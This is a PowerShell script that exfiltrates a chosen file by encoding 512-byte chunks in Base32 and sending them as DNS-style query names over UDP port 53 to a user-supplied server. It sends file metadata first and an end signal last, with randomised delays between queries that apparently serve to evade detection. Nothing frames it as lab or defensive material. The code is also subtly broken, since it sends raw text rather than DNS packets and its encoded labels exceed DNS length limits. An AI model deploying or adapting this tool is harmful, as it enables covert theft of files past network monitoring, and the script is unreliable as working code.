# Set DNS Server and Domain
$DNS_PORT = 53
$domain = "fileupload.example.com"  # Domain to use

# Base32 encoding function in PowerShell
function Base32-Encode {
    param (
        [byte[]]$bytes
    )
    
    $alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
    $output = ""
    $buffer = 0
    $bitsLeft = 0

    foreach ($byte in $bytes) {
        $buffer = ($buffer -shl 8) -bor $byte
        $bitsLeft += 8

        while ($bitsLeft -ge 5) {
            $bitsLeft -= 5
            $output += $alphabet[($buffer -shr $bitsLeft) -band 31]
        }
    }

    if ($bitsLeft -gt 0) {
        $output += $alphabet[($buffer -shl (5 - $bitsLeft)) -band 31]
    }

    return $output
}

# Function to resolve a DNS name to an IP address if necessary
function Resolve-DnsNameOrIp {
    param (
        [string]$server
    )

    # Check if the input is already a valid IP address
    if ([System.Net.IPAddress]::TryParse($server, [ref]$null)) {
        return $server  # Return the valid IP address as-is
    } else {
        # Attempt to resolve the DNS name to an IP address
        try {
            $resolvedIP = [System.Net.Dns]::GetHostAddresses($server) | Where-Object { $_.AddressFamily -eq 'InterNetwork' }
            if ($resolvedIP.Count -gt 0) {
                return $resolvedIP[0].IPAddressToString  # Return the first resolved IPv4 address
            } else {
                throw "No IPv4 address found for the DNS name."
            }
        } catch {
            Write-Host "Error: Unable to resolve '$server' to an IP address." -ForegroundColor Red
            throw $_  # Re-throw the exception to handle it elsewhere
        }
    }
}


# Function to calculate MD5 hash of a file
function Calculate-MD5 {
    param (
        [string]$filePath
    )

    $md5 = [System.Security.Cryptography.MD5]::Create()
    $fileStream = [System.IO.File]::OpenRead($filePath)
    $hashBytes = $md5.ComputeHash($fileStream)
    $fileStream.Close()

    return [BitConverter]::ToString($hashBytes) -replace '-'
}

# Function to send a DNS query with a random delay
function Send-DNSQuery {
    param (
        [string]$data,
        [string]$serverIP,   # Use resolved IP
        [double]$maxDelay
    )

    try {
        $serverEndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($serverIP), $DNS_PORT)
    } catch {
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
        return
    }

    try {
        $udpClient = New-Object System.Net.Sockets.UdpClient
        $queryBytes = [System.Text.Encoding]::ASCII.GetBytes($data)
        
        $null = $udpClient.Send($queryBytes, $queryBytes.Length, $serverEndPoint)
        $udpClient.Close()

        # Add a random delay between 0.1 seconds and the user-provided maximum delay
        $delay = Get-Random -Minimum 0.1 -Maximum $maxDelay
        Write-Host "Query sent, delaying next query by $([Math]::Round($delay, 2)) seconds."
        Start-Sleep -Seconds $delay
    } catch {
        Write-Host "Error sending DNS query: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Function to send file information (filename, MD5 hash, and chunk count)
function Send-FileInfo {
    param (
        [string]$fileName,
        [string]$fileMD5,
        [int]$totalChunks,
        [string]$serverIP,   # Use resolved IP
        [string]$domain,
        [double]$maxDelay
    )

    # Base32 encode the filename, MD5 hash, and chunk count as strings
    $encodedFileName = Base32-Encode ([System.Text.Encoding]::ASCII.GetBytes($fileName))
    $encodedFileMD5 = Base32-Encode ([System.Text.Encoding]::ASCII.GetBytes($fileMD5))
    $encodedChunkCount = Base32-Encode ([System.Text.Encoding]::ASCII.GetBytes([string]$totalChunks))

    $query = "f.$encodedFileName.$encodedFileMD5.$encodedChunkCount.$domain"
    Write-Host "Sending file info: $fileName, MD5: $fileMD5, Total Chunks: $totalChunks"
    $null = Send-DNSQuery -data $query -serverIP $serverIP -maxDelay $maxDelay
}

# Function to send file in chunks with randomized query sending
function Send-FileChunks {
    param (
        [string]$filePath,
        [string]$serverIP,   # Use resolved IP
        [string]$domain,
        [double]$maxDelay,
        [int]$totalChunks
    )

    $fileStream = [System.IO.File]::OpenRead($filePath)
    $chunkNumber = 0

    while ($chunkNumber -lt $totalChunks) {
        $buffer = New-Object byte[] 512  # Size of each chunk in bytes
        $bytesRead = $fileStream.Read($buffer, 0, 512)
        $encodedChunkData = Base32-Encode $buffer[0..($bytesRead-1)]

        # Display the current chunk number and total chunk count
        Write-Host "Sending chunk $chunkNumber of $totalChunks"

        $null = Send-DNSQuery -data "c$chunkNumber.$encodedChunkData.$domain" -serverIP $serverIP -maxDelay $maxDelay

        $chunkNumber++
    }

    $fileStream.Close()

    # Success message after all chunks are sent
    Write-Host "All chunks sent successfully!"
}

# Function to signal end of transmission
function Send-EndSignal {
    param (
        [string]$serverIP,   # Use resolved IP
        [string]$domain,
        [double]$maxDelay
    )

    $null = Send-DNSQuery -data "e.end.$domain" -serverIP $serverIP -maxDelay $maxDelay
    Write-Host "Sending end of transmission signal"
}

# Main function to send the file
function Send-File {
    param (
        [string]$filePath,
        [double]$maxDelay,
        [string]$server
    )

    $filePath = $filePath.Trim('"')  # Remove surrounding quotes if any
    $fileName = [System.IO.Path]::GetFileName($filePath)
    $fileMD5 = Calculate-MD5 -filePath $filePath
    $fileSize = (Get-Item $filePath).Length
    $chunkSize = 512
    $totalChunks = [Math]::Ceiling($fileSize / $chunkSize)

    # Resolve the server to an IP address and store it
    $serverIP = Resolve-DnsNameOrIp -server $server
    Write-Host "Resolved server IP: $serverIP"

    # First send file info (filename, MD5 hash, and chunk count)
    $null = Send-FileInfo -fileName $fileName -fileMD5 $fileMD5 -totalChunks $totalChunks -serverIP $serverIP -domain $domain -maxDelay $maxDelay

    # Now send file chunks
    $null = Send-FileChunks -filePath $filePath -serverIP $serverIP -domain $domain -maxDelay $maxDelay -totalChunks $totalChunks

    # Signal the end of transmission
    $null = Send-EndSignal -serverIP $serverIP -domain $domain -maxDelay $maxDelay

    # Print success message after entire file is sent and transmission ends
    Write-Host "File transmission complete!"
}

$filePath = Read-Host "Enter the file path to send"
$server = Read-Host "Enter the DNS name or IP address of the server"
$maxDelay = [double](Read-Host "Enter the maximum delay (in seconds) between queries")
Send-File -filePath $filePath -maxDelay $maxDelay -server $server
